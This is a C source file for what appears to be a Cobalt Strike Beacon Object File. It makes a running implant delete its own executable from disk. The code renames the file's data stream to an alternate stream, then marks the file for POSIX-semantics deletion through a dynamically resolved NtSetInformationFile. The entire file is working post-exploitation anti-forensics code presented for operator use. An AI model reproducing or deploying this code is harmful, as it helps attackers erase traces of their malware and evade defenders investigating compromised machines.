#include <windows.h>
#include "beacon.h"

// Required BOF declarations for Windows APIs
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$GetModuleFileNameW(HMODULE, LPWSTR, DWORD);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$SetFileInformationByHandle(HANDLE, FILE_INFO_BY_HANDLE_CLASS, LPVOID, DWORD);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$RtlCopyMemory(VOID*, const VOID*, SIZE_T);

#define CAPI(func_name) __declspec(dllimport) __typeof(func_name) func_name;
CAPI(wcslen)

// Native types (manually defined)
typedef LONG NTSTATUS;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef NTSTATUS(NTAPI* NtSetInformationFile_t)(
    HANDLE,
    PIO_STATUS_BLOCK,
    PVOID,
    ULONG,
    ULONG // file information class
);

typedef ULONG(NTAPI* RtlNtStatusToDosError_t)(NTSTATUS);

// FileDispositionInformationEx definitions
#ifndef FILE_DISPOSITION_INFORMATION_EX
#define FILE_DISPOSITION_INFORMATION_EX struct _FILE_DISPOSITION_INFORMATION_EX
#define FileDispositionInformationEx ((INT)64)
#define FILE_DISPOSITION_DELETE 0x00000001
#define FILE_DISPOSITION_POSIX_SEMANTICS 0x00000002
FILE_DISPOSITION_INFORMATION_EX {
    ULONG Flags;
};
#endif

void go(char* args, int alen) {
    formatp format;
    BeaconFormatAlloc(&format, 1024);
    BeaconFormatPrintf(&format, "Starting self-delete operation...\n");
    char* output = NULL;
    int outLen = 0;
    output = BeaconFormatToString(&format, &outLen);
    BeaconOutput(CALLBACK_OUTPUT, output, outLen);
    BeaconFormatReset(&format);

    const wchar_t* NewStream = L":TKYN";
    WCHAR szPath[MAX_PATH * 2] = { 0 };

    if (KERNEL32$GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "GetModuleFileNameW failed, code: %d", KERNEL32$GetLastError());
        BeaconFormatFree(&format);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Target file: %ls", szPath);

    HANDLE hFile = KERNEL32$CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFileW failed, code: %d", KERNEL32$GetLastError());
        BeaconFormatFree(&format);
        return;
    }

    SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(wchar_t) * wcslen(NewStream);
    PFILE_RENAME_INFO pRename = (PFILE_RENAME_INFO)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        KERNEL32$CloseHandle(hFile);
        BeaconPrintf(CALLBACK_ERROR, "HeapAlloc failed, code: %d", KERNEL32$GetLastError());
        BeaconFormatFree(&format);
        return;
    }

    pRename->FileNameLength = (DWORD)(wcslen(NewStream) * sizeof(wchar_t));
    KERNEL32$RtlCopyMemory(pRename->FileName, NewStream, pRename->FileNameLength);
    BeaconPrintf(CALLBACK_OUTPUT, "Renaming file data stream to %ls", NewStream);

    if (!KERNEL32$SetFileInformationByHandle(hFile, FileRenameInfo, pRename, (DWORD)sRename)) {
        BeaconPrintf(CALLBACK_ERROR, "SetFileInformationByHandle failed, code: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hFile);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pRename);
        BeaconFormatFree(&format);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Renamed successfully");
    KERNEL32$CloseHandle(hFile);

    // Reopen file to mark for deletion
    hFile = KERNEL32$CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        if (KERNEL32$GetLastError() == ERROR_FILE_NOT_FOUND) {
            BeaconPrintf(CALLBACK_OUTPUT, "File already deleted");
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pRename);
            BeaconFormatFree(&format);
            return;
        }
        BeaconPrintf(CALLBACK_ERROR, "Reopen file failed, code: %d", KERNEL32$GetLastError());
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pRename);
        BeaconFormatFree(&format);
        return;
    }

    // Dynamically resolve NtSetInformationFile and RtlNtStatusToDosError
    HMODULE ntdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load ntdll.dll");
        KERNEL32$CloseHandle(hFile);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pRename);
        BeaconFormatFree(&format);
        return;
    }

    NtSetInformationFile_t NtSetInformationFile = (NtSetInformationFile_t)KERNEL32$GetProcAddress(ntdll, "NtSetInformationFile");
    RtlNtStatusToDosError_t RtlNtStatusToDosError = (RtlNtStatusToDosError_t)KERNEL32$GetProcAddress(ntdll, "RtlNtStatusToDosError");

    if (!NtSetInformationFile || !RtlNtStatusToDosError) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve NtSetInformationFile or RtlNtStatusToDosError");
        KERNEL32$CloseHandle(hFile);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pRename);
        BeaconFormatFree(&format);
        return;
    }

    FILE_DISPOSITION_INFORMATION_EX dispo = { 0 };
    dispo.Flags = FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS;

    IO_STATUS_BLOCK iosb = { 0 };
    NTSTATUS status = NtSetInformationFile(hFile, &iosb, &dispo, sizeof(dispo), FileDispositionInformationEx);
    if (status < 0) {
        DWORD err = RtlNtStatusToDosError(status);
        BeaconPrintf(CALLBACK_ERROR, "NtSetInformationFile failed. NTSTATUS: 0x%08x, Win32: %d", status, err);
        KERNEL32$CloseHandle(hFile);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pRename);
        BeaconFormatFree(&format);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "File marked for deletion with POSIX semantics");
    KERNEL32$CloseHandle(hFile);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pRename);
    BeaconPrintf(CALLBACK_OUTPUT, "Self-deletion succeeded");
    BeaconFormatFree(&format);
}
